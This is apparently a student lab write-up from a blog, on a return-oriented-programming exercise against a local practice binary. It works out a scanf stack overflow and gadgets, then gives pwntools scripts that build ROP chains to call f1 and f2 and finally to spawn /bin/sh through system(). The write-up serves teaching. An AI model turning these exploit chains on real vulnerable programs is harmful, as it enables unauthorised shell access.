---
layout: post
title:  UNIBUC_RE_lab_6_task_1
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: ROP and ASLR exercise
categories:
- UNIBUC RE
---

ROP and ASLR exercise

This exercise is simple and can be approximated as follows:
- we have a easy scanf that is vulnerable:
![](/assets/img/2022-09-02-08-36-43.png)

Looking at the stack we see we can put 136 bytes and then the return.
![](/assets/img/2022-09-02-08-42-54.png)

![](/assets/img/2022-09-02-08-49-51.png)
- Put 0xdeadbeef on stack then call f1

We look for rop gadgets using : `ROPgadget --binary task01`

We see the following interesting rops:
![](/assets/img/2022-09-02-11-45-01.png)

We should put the argument and then jump to it giving us the following payload:

```
from pwn import *

from ctypes import *

io = process("./task01")
io.recvuntil("name")
gdb.attach(io,'break *0x401258 ')
io.sendline(128*b'a'+8*b'x'+p64(0x4012db)+p64(0xdeadbeef)+p64(0x0401186))
io.interactive()

```
After executing this script we should have x'es in the RBP register and get f1 called with deadbeef:

![](/assets/img/2022-09-02-12-02-00.png)


![](/assets/img/2022-09-02-12-02-15.png)

- f2 with the parameters 0x1234, 0xabcd 

we see that we can find the following gadget:
`0x00000000004012d9 : pop rsi ; pop r15 ; ret`

```
from pwn import *

from ctypes import *
e = ELF('./task01')
pop_rdi=0x4012db
pop_rsir15=0x4012d9
io = process("./task01")
io.recvuntil("name")
gdb.attach(io,'break *0x401258 ')
io.sendline(128*b'a'+8*b'x'+p64(pop_rdi)+p64(0xdeadbeef)+p64(e.symbols['f1'])+p64(pop_rdi)+p64(0x1234)+p64(pop_rsir15)+p64(0xabcd)+p64(0xdeadbeef)+p64(e.symbols['f2']))
io.interactive()

```

![](/assets/img/2022-09-02-12-21-33.png)

- call /bin/sh

![](/assets/img/2022-09-02-12-25-55.png)

We get the string we look so it doesn't have space or \n the first string has 20 which is space in ascii so it could break our exploit we'll use the latter.

```
from pwn import *

from ctypes import *
e = ELF('./task01')
pop_rdi=0x4012db
bin_sh=0x403072
pop_rsir15=0x4012d9
io = process("./task01")
io.recvuntil("name")
#gdb.attach(io,'break *0x401258 ')
io.sendline(128*b'a'+8*b'x'+p64(pop_rdi)+p64(bin_sh)+p64(e.symbols['system']))
io.interactive()
```